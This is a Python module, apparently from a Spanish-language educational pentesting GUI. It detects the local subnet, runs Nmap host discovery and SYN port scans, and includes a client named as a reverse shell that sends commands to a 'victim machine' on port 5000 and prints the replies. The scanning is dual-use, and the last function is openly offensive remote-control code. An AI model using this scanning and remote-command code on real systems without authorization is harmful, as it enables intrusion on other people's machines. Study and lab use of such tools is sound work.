import netifaces
import nmap
from tkinter import messagebox
from socket import socket
from tkinter import messagebox
from utils import mostrar_resultado_con_descarga


def get_network_range():
    """Obtiene el rango de la red automáticamente."""
    try:
        # Obtener todas las interfaces de red
        interfaces = netifaces.interfaces()
        
        for interface in interfaces:
            if interface == "lo":  # Ignorar la interfaz de loopback
                continue
            
            # Obtener las direcciones IP de la interfaz
            addresses = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addresses:
                ip_info = addresses[netifaces.AF_INET][0]
                if "addr" in ip_info and "netmask" in ip_info:
                    ip = ip_info["addr"]
                    netmask = ip_info["netmask"]
                    
                    # Calcular el rango de la red
                    if ip and netmask:
                        # Convertir la IP y la máscara a formato binario
                        ip_parts = list(map(int, ip.split(".")))
                        mask_parts = list(map(int, netmask.split(".")))
                        
                        # Calcular la dirección de red
                        network_parts = [ip_parts[i] & mask_parts[i] for i in range(4)]
                        network = ".".join(map(str, network_parts))
                        
                        # Calcular el rango (asumiendo una máscara /24 por defecto)
                        if mask_parts == [255, 255, 255, 0]:  # Máscara /24
                            return f"{network}/24"
                        else:
                            # Si la máscara no es /24, devolver el rango completo
                            return f"{network}/{sum(bin(int(x)).count('1') for x in netmask.split('.'))}"
        
        # Si no se encontró ninguna interfaz válida
        return None
    except Exception as e:
        print(f"Error al obtener el rango de la red: {e}")
        return None


def scan_ports(ip, start_port=1, end_port=1024):
    """
    Escanea los puertos de una IP utilizando Nmap.
    
    :param ip: Dirección IP a escanear.
    :param start_port: Puerto inicial del rango (por defecto 1).
    :param end_port: Puerto final del rango (por defecto 1024).
    :return: Lista de puertos abiertos.
    """
    try:
        # Crear un objeto nmap.PortScanner
        nm = nmap.PortScanner()

        # Definir el rango de puertos
        port_range = f"{start_port}-{end_port}"

        # Ejecutar el escaneo
        nm.scan(ip, port_range, arguments='-sS')  # Escaneo SYN (half-open)

        # Obtener los puertos abiertos
        open_ports = []
        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                ports = nm[host][proto].keys()
                for port in ports:
                    if nm[host][proto][port]['state'] == 'open':
                        open_ports.append(port)

        return open_ports
    except Exception as e:
        print(f"Error al escanear puertos: {e}")
        return []


def open_port_scanner(ip, start_port, end_port):
    """Escanea los puertos de una IP y muestra los resultados."""
    if not ip:
        messagebox.showerror("Error", "Por favor, ingresa una IP objetivo.")
        return
    
    # Escanear puertos
    open_ports = scan_ports(ip, start_port, end_port)
    
    if open_ports:
        result_text = f"Puertos abiertos en {ip} (puertos {start_port}-{end_port}):\n{', '.join(map(str, open_ports))}"
        
        # Mostrar el resultado con la opción de descargar
        mostrar_resultado_con_descarga(
            titulo="Escaneo de Puertos",
            mensaje=result_text,
            nombre_archivo=f"escaneopuertos_{ip}.txt"
        )
    else:
        messagebox.showinfo("Escaneo de Puertos", f"No se encontraron puertos abiertos en {ip} (puertos {start_port}-{end_port}).")

def scan_network(ip_range):
    """
    Escanea la red en busca de dispositivos activos utilizando Nmap.
    
    :param ip_range: Rango de IPs a escanear (ej. "192.168.1.0/24").
    :return: Lista de dispositivos encontrados con sus IPs y nombres de host.
    """
    try:
        # Crear un objeto nmap.PortScanner
        nm = nmap.PortScanner()

        # Ejecutar el escaneo de la red
        nm.scan(hosts=ip_range, arguments='-sn')  # Escaneo de descubrimiento (ping scan)

        # Procesar los resultados
        devices = []
        for host in nm.all_hosts():
            if 'mac' in nm[host]['addresses']:
                mac = nm[host]['addresses']['mac']
            else:
                mac = "Desconocida"
            
            if 'hostname' in nm[host]['hostnames'][0]:
                hostname = nm[host]['hostnames'][0]['hostname']
            else:
                hostname = "Desconocido"

            devices.append({'ip': host, 'mac': mac, 'hostname': hostname})

        return devices
    except Exception as e:
        print(f"Error al escanear la red: {e}")
        return []


def open_network_scan():
    """Escanea la red y muestra los dispositivos encontrados."""
    # Obtener el rango de la red automáticamente
    ip_range = get_network_range()
    if not ip_range:
        messagebox.showerror("Error", "No se pudo detectar la red. Asegúrate de estar conectado a una red.")
        return

    # Escanear la red
    devices = scan_network(ip_range)
    if devices:
        result_text = f"Dispositivos encontrados en la red {ip_range}:\n\n"
        for device in devices:
            result_text += f"IP: {device['ip']}, MAC: {device['mac']}, Hostname: {device['hostname']}\n"
        
        # Mostrar el resultado con la opción de descargar
        mostrar_resultado_con_descarga(
            titulo="Detección de Máquinas",
            mensaje=result_text,
            nombre_archivo="escaneored.txt"
        )
    else:
        messagebox.showinfo("Detección de Máquinas", "No se encontraron dispositivos.")

def open_reverse_shell(ip):
    """
    Inicia una shell inversa con la IP objetivo.
    
    :param ip: Dirección IP de la máquina víctima.
    """
    if not ip:
        messagebox.showerror("Error", "Por favor, ingresa una IP objetivo.")
        return

    # Mostrar un mensaje de conexión
    messagebox.showinfo("Shell Inversa", f"Conectando a {ip}...")

    try:
        # Definimos la dirección y puerto del servidor (Siempre de la máquina víctima)
        server_address = (ip, 5000)  # Puerto 5000 por defecto

        # Creamos el socket cliente
        client_socket = socket()
        client_socket.connect(server_address)
        estado = True

        while estado:
            # Solicitamos al usuario que introduzca un comando
            comando_enviar = input("Introduce el comando que quieras enviar a la máquina víctima (o 'exit' para salir): ")

            # Si el usuario introduce "exit", cerramos la conexión y salimos del bucle
            if comando_enviar == 'exit':
                # Le decimos al servidor que la conexión la cerramos:
                client_socket.send(comando_enviar.encode())
                # Cerramos el socket
                client_socket.close()
                estado = False
            else:
                # Enviamos el comando a la máquina víctima:
                client_socket.send(comando_enviar.encode())

                # Esperamos a recibir la respuesta de la víctima y lo guardamos en la variable respuesta.
                respuesta = client_socket.recv(4096)

                # Imprimimos la respuesta
                print(respuesta.decode())
    except Exception as e:
        messagebox.showerror("Error", f"Error al conectar con {ip}: {e}")